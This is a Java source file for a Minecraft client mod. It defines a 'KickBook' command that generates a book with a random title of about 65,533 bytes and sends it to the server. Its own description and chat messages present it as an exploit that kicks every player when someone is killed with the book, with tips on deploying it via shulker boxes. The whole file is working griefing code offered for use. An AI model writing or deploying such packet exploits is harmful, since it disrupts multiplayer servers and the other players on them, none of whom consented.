package me.constantindev.ccl.command;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.base.Command;
import me.constantindev.ccl.etc.helper.ClientHelper;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;

import java.nio.charset.StandardCharsets;
import java.util.Objects;
import java.util.Random;

public class KickBook extends Command {
    public KickBook() {
        super("KickBook", "Creates a book that kicks everyone when someone gets killed by it", new String[]{"kbook", "kickbook", "kbk"});

    }

    String genBook(int l) {
        int data_len = 0;
        StringBuilder builder = new StringBuilder();
        Random rand = new Random();
        while (data_len < l) {
            int i = rand.nextInt(0x3F) + 0x40;

            String c = String.valueOf((char) i);
            data_len += c.getBytes(StandardCharsets.UTF_8).length;
            builder.append(c);
        }

        return builder.toString();
    }

    @Override
    public void onExecute(String[] args) {
        ClientHelper.sendChat("Get 4 of these in a named shulker and kill someone with it ;)");
        ClientHelper.sendChat("Turn off chat to be immune");
        assert Cornos.minecraft.player != null;
        int s = Cornos.minecraft.player.inventory.selectedSlot;
        ItemStack stack = Cornos.minecraft.player.inventory.getStack(s);
        if (stack.getItem() != Items.WRITABLE_BOOK) {
            ClientHelper.sendChat("pls hold a writable book thx");
            return;
        }
        String exploit = genBook(65533);
        stack.putSubTag("author", StringTag.of(Cornos.minecraft.player.getGameProfile().getName()));
        stack.putSubTag("title", StringTag.of(exploit));
        stack.putSubTag("pages", new ListTag());

        BookUpdateC2SPacket p = new BookUpdateC2SPacket(stack, true, s);
        Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(p);

        super.onExecute(args);
    }
}
